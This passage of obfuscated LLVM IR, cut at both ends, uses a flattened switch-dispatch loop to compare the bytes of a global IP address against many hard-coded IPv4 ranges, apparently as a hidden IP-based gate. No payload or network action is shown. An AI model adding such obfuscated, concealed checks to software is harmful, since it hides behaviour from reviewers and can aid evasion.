  %1660 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1661 = zext i8 %1660 to i32
  %1662 = icmp slt i32 %1661, 252
  %1663 = select i1 %1662, i32 -1813357520, i32 357657725
  store i32 %1663, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1664:                                   ; preds = %loopEntry
  %1665 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1666 = zext i8 %1665 to i32
  %1667 = icmp eq i32 %1666, 66
  %1668 = select i1 %1667, i32 1688748640, i32 882053550
  store i32 %1668, i32* %switchVar
  br label %loopEnd

; <label>:1669:                                   ; preds = %loopEntry
  %1670 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1671 = zext i8 %1670 to i32
  %1672 = icmp eq i32 %1671, 55
  %1673 = select i1 %1672, i32 2085947030, i32 882053550
  store i32 %1673, i32* %switchVar
  br label %loopEnd

; <label>:1674:                                   ; preds = %loopEntry
  %1675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1676 = zext i8 %1675 to i32
  %1677 = icmp sge i32 %1676, 128
  %1678 = select i1 %1677, i32 114392341, i32 882053550
  store i32 %1678, i32* %switchVar
  br label %loopEnd

; <label>:1679:                                   ; preds = %loopEntry
  %1680 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1681 = zext i8 %1680 to i32
  %1682 = icmp slt i32 %1681, 159
  %1683 = select i1 %1682, i32 -1813357520, i32 882053550
  store i32 %1683, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1684:                                   ; preds = %loopEntry
  %1685 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1686 = zext i8 %1685 to i32
  %1687 = icmp eq i32 %1686, 45
  %1688 = select i1 %1687, i32 1470146259, i32 1093759215
  store i32 %1688, i32* %switchVar
  br label %loopEnd

; <label>:1689:                                   ; preds = %loopEntry
  %1690 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1691 = zext i8 %1690 to i32
  %1692 = icmp eq i32 %1691, 63
  %1693 = select i1 %1692, i32 -706161736, i32 1093759215
  store i32 %1693, i32* %switchVar
  br label %loopEnd

; <label>:1694:                                   ; preds = %loopEntry
  %1695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1696 = zext i8 %1695 to i32
  %1697 = icmp sge i32 %1696, 1
  %1698 = select i1 %1697, i32 997716220, i32 1093759215
  store i32 %1698, i32* %switchVar
  br label %loopEnd

; <label>:1699:                                   ; preds = %loopEntry
  %1700 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1701 = zext i8 %1700 to i32
  %1702 = icmp slt i32 %1701, 127
  %1703 = select i1 %1702, i32 -1813357520, i32 1093759215
  store i32 %1703, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1704:                                   ; preds = %loopEntry
  %1705 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1706 = zext i8 %1705 to i32
  %1707 = icmp eq i32 %1706, 216
  %1708 = select i1 %1707, i32 1790630332, i32 -1132867674
  store i32 %1708, i32* %switchVar
  br label %loopEnd

; <label>:1709:                                   ; preds = %loopEntry
  %1710 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1711 = zext i8 %1710 to i32
  %1712 = icmp eq i32 %1711, 237
  %1713 = select i1 %1712, i32 254145420, i32 -1132867674
  store i32 %1713, i32* %switchVar
  br label %loopEnd

; <label>:1714:                                   ; preds = %loopEntry
  %1715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1716 = zext i8 %1715 to i32
  %1717 = icmp sge i32 %1716, 128
  %1718 = select i1 %1717, i32 618572945, i32 -1132867674
  store i32 %1718, i32* %switchVar
  br label %loopEnd

; <label>:1719:                                   ; preds = %loopEntry
  %1720 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1721 = zext i8 %1720 to i32
  %1722 = icmp slt i32 %1721, 159
  %1723 = select i1 %1722, i32 -1813357520, i32 -1132867674
  store i32 %1723, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1724:                                   ; preds = %loopEntry
  %1725 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1726 = zext i8 %1725 to i32
  %1727 = icmp eq i32 %1726, 108
  %1728 = select i1 %1727, i32 1876112926, i32 -1989816328
  store i32 %1728, i32* %switchVar
  br label %loopEnd

; <label>:1729:                                   ; preds = %loopEntry
  %1730 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1731 = zext i8 %1730 to i32
  %1732 = icmp eq i32 %1731, 61
  %1733 = select i1 %1732, i32 -1813357520, i32 -1989816328
  store i32 %1733, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1734:                                   ; preds = %loopEntry
  %1735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1736 = zext i8 %1735 to i32
  %1737 = icmp eq i32 %1736, 45
  %1738 = select i1 %1737, i32 -2114321038, i32 521427725
  store i32 %1738, i32* %switchVar
  br label %loopEnd

; <label>:1739:                                   ; preds = %loopEntry
  %1740 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1741 = zext i8 %1740 to i32
  %1742 = icmp eq i32 %1741, 76
  %1743 = select i1 %1742, i32 -1813357520, i32 521427725
  store i32 %1743, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1744:                                   ; preds = %loopEntry
  %1745 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1746 = zext i8 %1745 to i32
  %1747 = icmp eq i32 %1746, 185
  %1748 = select i1 %1747, i32 660868117, i32 -1355045286
  store i32 %1748, i32* %switchVar
  br label %loopEnd

; <label>:1749:                                   ; preds = %loopEntry
  %1750 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1751 = zext i8 %1750 to i32
  %1752 = icmp eq i32 %1751, 11
  %1753 = select i1 %1752, i32 277123946, i32 -1355045286
  store i32 %1753, i32* %switchVar
  br label %loopEnd

; <label>:1754:                                   ; preds = %loopEntry
  %1755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1756 = zext i8 %1755 to i32
  %1757 = icmp sge i32 %1756, 144
  %1758 = select i1 %1757, i32 105281823, i32 -1355045286
  store i32 %1758, i32* %switchVar
  br label %loopEnd

; <label>:1759:                                   ; preds = %loopEntry
  %1760 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1761 = zext i8 %1760 to i32
  %1762 = icmp slt i32 %1761, 148
  %1763 = select i1 %1762, i32 -1813357520, i32 -1355045286
  store i32 %1763, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1764:                                   ; preds = %loopEntry
  %1765 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1766 = zext i8 %1765 to i32
  %1767 = icmp eq i32 %1766, 185
  %1768 = select i1 %1767, i32 -869417784, i32 -1387967374
  store i32 %1768, i32* %switchVar
  br label %loopEnd

; <label>:1769:                                   ; preds = %loopEntry
  %1770 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1771 = zext i8 %1770 to i32
  %1772 = icmp eq i32 %1771, 56
  %1773 = select i1 %1772, i32 414685238, i32 -1387967374
  store i32 %1773, i32* %switchVar
  br label %loopEnd

; <label>:1774:                                   ; preds = %loopEntry
  %1775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1776 = zext i8 %1775 to i32
  %1777 = icmp sge i32 %1776, 21
  %1778 = select i1 %1777, i32 497232230, i32 -1387967374
  store i32 %1778, i32* %switchVar
  br label %loopEnd

; <label>:1779:                                   ; preds = %loopEntry
  %1780 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1781 = zext i8 %1780 to i32
  %1782 = icmp slt i32 %1781, 23
  %1783 = select i1 %1782, i32 -1813357520, i32 -1387967374
  store i32 %1783, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1784:                                   ; preds = %loopEntry
  %1785 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1786 = zext i8 %1785 to i32
  %1787 = icmp eq i32 %1786, 185
  %1788 = select i1 %1787, i32 85809710, i32 -942272044
  store i32 %1788, i32* %switchVar
  br label %loopEnd

; <label>:1789:                                   ; preds = %loopEntry
  %1790 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1791 = zext i8 %1790 to i32
  %1792 = icmp eq i32 %1791, 61
  %1793 = select i1 %1792, i32 334138729, i32 -942272044
  store i32 %1793, i32* %switchVar
  br label %loopEnd

; <label>:1794:                                   ; preds = %loopEntry
  %1795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1796 = zext i8 %1795 to i32
  %1797 = icmp sge i32 %1796, 136
  %1798 = select i1 %1797, i32 1128617147, i32 -942272044
  store i32 %1798, i32* %switchVar
  br label %loopEnd

; <label>:1799:                                   ; preds = %loopEntry
  %1800 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1801 = zext i8 %1800 to i32
  %1802 = icmp slt i32 %1801, 139
  %1803 = select i1 %1802, i32 -1813357520, i32 -942272044
  store i32 %1803, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1804:                                   ; preds = %loopEntry
  %1805 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1806 = zext i8 %1805 to i32
  %1807 = icmp eq i32 %1806, 185
  %1808 = select i1 %1807, i32 -1773652159, i32 1095827156
  store i32 %1808, i32* %switchVar
  br label %loopEnd

; <label>:1809:                                   ; preds = %loopEntry
  %1810 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1811 = zext i8 %1810 to i32
  %1812 = icmp eq i32 %1811, 62
  %1813 = select i1 %1812, i32 -1391954405, i32 1095827156
  store i32 %1813, i32* %switchVar
  br label %loopEnd

; <label>:1814:                                   ; preds = %loopEntry
  %1815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1816 = zext i8 %1815 to i32
  %1817 = icmp sge i32 %1816, 187
  %1818 = select i1 %1817, i32 886699317, i32 1095827156
  store i32 %1818, i32* %switchVar
  br label %loopEnd

; <label>:1819:                                   ; preds = %loopEntry
  %1820 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1821 = zext i8 %1820 to i32
  %1822 = icmp slt i32 %1821, 191
  %1823 = select i1 %1822, i32 -1813357520, i32 1095827156
  store i32 %1823, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1824:                                   ; preds = %loopEntry
  %1825 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1826 = zext i8 %1825 to i32
  %1827 = icmp eq i32 %1826, 66
  %1828 = select i1 %1827, i32 743599844, i32 2037171048
  store i32 %1828, i32* %switchVar
  br label %loopEnd

; <label>:1829:                                   ; preds = %loopEntry
  %1830 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1831 = zext i8 %1830 to i32
  %1832 = icmp eq i32 %1831, 150
  %1833 = select i1 %1832, i32 -1568015878, i32 2037171048
  store i32 %1833, i32* %switchVar
  br label %loopEnd

; <label>:1834:                                   ; preds = %loopEntry
  %1835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1836 = zext i8 %1835 to i32
  %1837 = icmp sge i32 %1836, 120
  %1838 = select i1 %1837, i32 -127776463, i32 2037171048
  store i32 %1838, i32* %switchVar
  br label %loopEnd

; <label>:1839:                                   ; preds = %loopEntry
  %1840 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1841 = zext i8 %1840 to i32
  %1842 = icmp slt i32 %1841, 215
  %1843 = select i1 %1842, i32 -1813357520, i32 2037171048
  store i32 %1843, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1844:                                   ; preds = %loopEntry
  %1845 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1846 = zext i8 %1845 to i32
  %1847 = icmp eq i32 %1846, 66
  %1848 = select i1 %1847, i32 684195860, i32 1945766317
  store i32 %1848, i32* %switchVar
  br label %loopEnd

; <label>:1849:                                   ; preds = %loopEntry
  %1850 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1851 = zext i8 %1850 to i32
  %1852 = icmp eq i32 %1851, 151
  %1853 = select i1 %1852, i32 928957803, i32 1945766317
  store i32 %1853, i32* %switchVar
  br label %loopEnd

; <label>:1854:                                   ; preds = %loopEntry
  %1855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1856 = zext i8 %1855 to i32
  %1857 = icmp sge i32 %1856, 137
  %1858 = select i1 %1857, i32 387359047, i32 1945766317
  store i32 %1858, i32* %switchVar
  br label %loopEnd

; <label>:1859:                                   ; preds = %loopEntry
  %1860 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1861 = zext i8 %1860 to i32
  %1862 = icmp slt i32 %1861, 139
  %1863 = select i1 %1862, i32 -1813357520, i32 1945766317
  store i32 %1863, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1864:                                   ; preds = %loopEntry
  %1865 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1866 = zext i8 %1865 to i32
  %1867 = icmp eq i32 %1866, 64
  %1868 = select i1 %1867, i32 1848862925, i32 -1335856351
  store i32 %1868, i32* %switchVar
  br label %loopEnd

; <label>:1869:                                   ; preds = %loopEntry
  %1870 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1871 = zext i8 %1870 to i32
  %1872 = icmp eq i32 %1871, 94
  %1873 = select i1 %1872, i32 -315986008, i32 -1335856351
  store i32 %1873, i32* %switchVar
  br label %loopEnd

; <label>:1874:                                   ; preds = %loopEntry
  %1875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1876 = zext i8 %1875 to i32
  %1877 = icmp sge i32 %1876, 237
  %1878 = select i1 %1877, i32 -1090452901, i32 -1335856351
  store i32 %1878, i32* %switchVar
  br label %loopEnd

; <label>:1879:                                   ; preds = %loopEntry
  %1880 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1881 = zext i8 %1880 to i32
  %1882 = icmp slt i32 %1881, 255
  %1883 = select i1 %1882, i32 -1813357520, i32 -1335856351
  store i32 %1883, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1884:                                   ; preds = %loopEntry
  %1885 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1886 = zext i8 %1885 to i32
  %1887 = icmp eq i32 %1886, 63
  %1888 = select i1 %1887, i32 -769758214, i32 279691605
  store i32 %1888, i32* %switchVar
  br label %loopEnd

; <label>:1889:                                   ; preds = %loopEntry
  %1890 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1891 = zext i8 %1890 to i32
  %1892 = icmp eq i32 %1891, 251
  %1893 = select i1 %1892, i32 1342280244, i32 279691605
  store i32 %1893, i32* %switchVar
  br label %loopEnd

; <label>:1894:                                   ; preds = %loopEntry
  %1895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1896 = zext i8 %1895 to i32
  %1897 = icmp sge i32 %1896, 19
  %1898 = select i1 %1897, i32 822502802, i32 279691605
  store i32 %1898, i32* %switchVar
  br label %loopEnd

; <label>:1899:                                   ; preds = %loopEntry
  %1900 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1901 = zext i8 %1900 to i32
  %1902 = icmp slt i32 %1901, 21
  %1903 = select i1 %1902, i32 -1813357520, i32 279691605
  store i32 %1903, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1904:                                   ; preds = %loopEntry
  %1905 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1906 = zext i8 %1905 to i32
  %1907 = icmp eq i32 %1906, 70
  %1908 = select i1 %1907, i32 280382638, i32 -1138331224
  store i32 %1908, i32* %switchVar
  br label %loopEnd

; <label>:1909:                                   ; preds = %loopEntry
  %1910 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1911 = zext i8 %1910 to i32
  %1912 = icmp eq i32 %1911, 42
  %1913 = select i1 %1912, i32 -1430947651, i32 -1138331224
  store i32 %1913, i32* %switchVar
  br label %loopEnd

; <label>:1914:                                   ; preds = %loopEntry
  %1915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1916 = zext i8 %1915 to i32
  %1917 = icmp sge i32 %1916, 73
  %1918 = select i1 %1917, i32 -916204273, i32 -1138331224
  store i32 %1918, i32* %switchVar
  br label %loopEnd

; <label>:1919:                                   ; preds = %loopEntry
  %1920 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1921 = zext i8 %1920 to i32
  %1922 = icmp slt i32 %1921, 75
  %1923 = select i1 %1922, i32 -1813357520, i32 -1138331224
  store i32 %1923, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1924:                                   ; preds = %loopEntry
  %1925 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1926 = zext i8 %1925 to i32
  %1927 = icmp eq i32 %1926, 74
  %1928 = select i1 %1927, i32 2040833982, i32 -1526004572
  store i32 %1928, i32* %switchVar
  br label %loopEnd

; <label>:1929:                                   ; preds = %loopEntry
  %1930 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1931 = zext i8 %1930 to i32
  %1932 = icmp eq i32 %1931, 91
  %1933 = select i1 %1932, i32 2082760968, i32 -1526004572
  store i32 %1933, i32* %switchVar
  br label %loopEnd

; <label>:1934:                                   ; preds = %loopEntry
  %1935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1936 = zext i8 %1935 to i32
  %1937 = icmp sge i32 %1936, 113
  %1938 = select i1 %1937, i32 621190096, i32 -1526004572
  store i32 %1938, i32* %switchVar
  br label %loopEnd

; <label>:1939:                                   ; preds = %loopEntry
  %1940 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1941 = zext i8 %1940 to i32
  %1942 = icmp slt i32 %1941, 115
  %1943 = select i1 %1942, i32 -1813357520, i32 -1526004572
  store i32 %1943, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1944:                                   ; preds = %loopEntry
  %1945 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1946 = zext i8 %1945 to i32
  %1947 = icmp eq i32 %1946, 74
  %1948 = select i1 %1947, i32 -1369859667, i32 -859478568
  store i32 %1948, i32* %switchVar
  br label %loopEnd

; <label>:1949:                                   ; preds = %loopEntry
  %1950 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1951 = zext i8 %1950 to i32
  %1952 = icmp eq i32 %1951, 201
  %1953 = select i1 %1952, i32 1088260751, i32 -859478568
  store i32 %1953, i32* %switchVar
  br label %loopEnd

; <label>:1954:                                   ; preds = %loopEntry
  %1955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1956 = zext i8 %1955 to i32
  %1957 = icmp sge i32 %1956, 56
  %1958 = select i1 %1957, i32 -1319598955, i32 -859478568
  store i32 %1958, i32* %switchVar
  br label %loopEnd

; <label>:1959:                                   ; preds = %loopEntry
  %1960 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1961 = zext i8 %1960 to i32
  %1962 = icmp slt i32 %1961, 58
  %1963 = select i1 %1962, i32 -1813357520, i32 -859478568
  store i32 %1963, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1964:                                   ; preds = %loopEntry
  %1965 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1966 = zext i8 %1965 to i32
  %1967 = icmp eq i32 %1966, 188
  %1968 = select i1 %1967, i32 -560512373, i32 336215145
  store i32 %1968, i32* %switchVar
  br label %loopEnd

; <label>:1969:                                   ; preds = %loopEntry
  %1970 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1971 = zext i8 %1970 to i32
  %1972 = icmp eq i32 %1971, 209
  %1973 = select i1 %1972, i32 1547411949, i32 336215145
  store i32 %1973, i32* %switchVar
  br label %loopEnd

; <label>:1974:                                   ; preds = %loopEntry
  %1975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1976 = zext i8 %1975 to i32
  %1977 = icmp sge i32 %1976, 48
  %1978 = select i1 %1977, i32 -2046362501, i32 336215145
  store i32 %1978, i32* %switchVar
  br label %loopEnd

; <label>:1979:                                   ; preds = %loopEntry
  %1980 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1981 = zext i8 %1980 to i32
  %1982 = icmp slt i32 %1981, 53
  %1983 = select i1 %1982, i32 -1813357520, i32 336215145
  store i32 %1983, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1984:                                   ; preds = %loopEntry
  %1985 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1986 = zext i8 %1985 to i32
  %1987 = icmp eq i32 %1986, 188
  %1988 = select i1 %1987, i32 -2096696286, i32 1253658509
  store i32 %1988, i32* %switchVar
  br label %loopEnd

; <label>:1989:                                   ; preds = %loopEntry
  %1990 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1991 = zext i8 %1990 to i32
  %1992 = icmp eq i32 %1991, 165
  %1993 = select i1 %1992, i32 -1813357520, i32 1253658509
  store i32 %1993, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1994:                                   ; preds = %loopEntry
  %1995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1996 = zext i8 %1995 to i32
  %1997 = icmp eq i32 %1996, 149
  %1998 = select i1 %1997, i32 -1464603676, i32 -1671336560
  store i32 %1998, i32* %switchVar
  br label %loopEnd

; <label>:1999:                                   ; preds = %loopEntry
  %2000 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2001 = zext i8 %2000 to i32
  %2002 = icmp eq i32 %2001, 202
  %2003 = select i1 %2002, i32 -1813357520, i32 -1671336560
  store i32 %2003, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2004:                                   ; preds = %loopEntry
  %2005 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2006 = zext i8 %2005 to i32
  %2007 = icmp eq i32 %2006, 151
  %2008 = select i1 %2007, i32 -316901977, i32 1138863375
  store i32 %2008, i32* %switchVar
  br label %loopEnd

; <label>:2009:                                   ; preds = %loopEntry
  %2010 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2011 = zext i8 %2010 to i32
  %2012 = icmp eq i32 %2011, 80
  %2013 = select i1 %2012, i32 -1813357520, i32 1138863375
  store i32 %2013, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2014:                                   ; preds = %loopEntry
  %2015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2016 = zext i8 %2015 to i32
  %2017 = icmp eq i32 %2016, 164
  %2018 = select i1 %2017, i32 40013815, i32 -1026474557
  store i32 %2018, i32* %switchVar
  br label %loopEnd

; <label>:2019:                                   ; preds = %loopEntry
  %2020 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2021 = zext i8 %2020 to i32
  %2022 = icmp eq i32 %2021, 132
  %2023 = select i1 %2022, i32 -1813357520, i32 -1026474557
  store i32 %2023, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2024:                                   ; preds = %loopEntry
  %2025 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2026 = zext i8 %2025 to i32
  %2027 = icmp eq i32 %2026, 176
  %2028 = select i1 %2027, i32 -961045029, i32 -494987197
  store i32 %2028, i32* %switchVar
  br label %loopEnd

; <label>:2029:                                   ; preds = %loopEntry
  %2030 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2031 = zext i8 %2030 to i32
  %2032 = icmp eq i32 %2031, 31
  %2033 = select i1 %2032, i32 -1813357520, i32 -494987197
  store i32 %2033, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2034:                                   ; preds = %loopEntry
  %2035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2036 = zext i8 %2035 to i32
  %2037 = icmp eq i32 %2036, 167
  %2038 = select i1 %2037, i32 1051315666, i32 -164213280
  store i32 %2038, i32* %switchVar
  br label %loopEnd

; <label>:2039:                                   ; preds = %loopEntry
  %2040 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2041 = zext i8 %2040 to i32
  %2042 = icmp eq i32 %2041, 114
  %2043 = select i1 %2042, i32 -1813357520, i32 -164213280
  store i32 %2043, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2044:                                   ; preds = %loopEntry
  %2045 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2046 = zext i8 %2045 to i32
  %2047 = icmp eq i32 %2046, 178
  %2048 = select i1 %2047, i32 -1855318373, i32 -687760680
  store i32 %2048, i32* %switchVar
  br label %loopEnd

; <label>:2049:                                   ; preds = %loopEntry
  %2050 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2051 = zext i8 %2050 to i32
  %2052 = icmp eq i32 %2051, 32
  %2053 = select i1 %2052, i32 -1813357520, i32 -687760680
  store i32 %2053, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2054:                                   ; preds = %loopEntry
  %2055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2056 = zext i8 %2055 to i32
  %2057 = icmp eq i32 %2056, 178
  %2058 = select i1 %2057, i32 351864242, i32 198448835
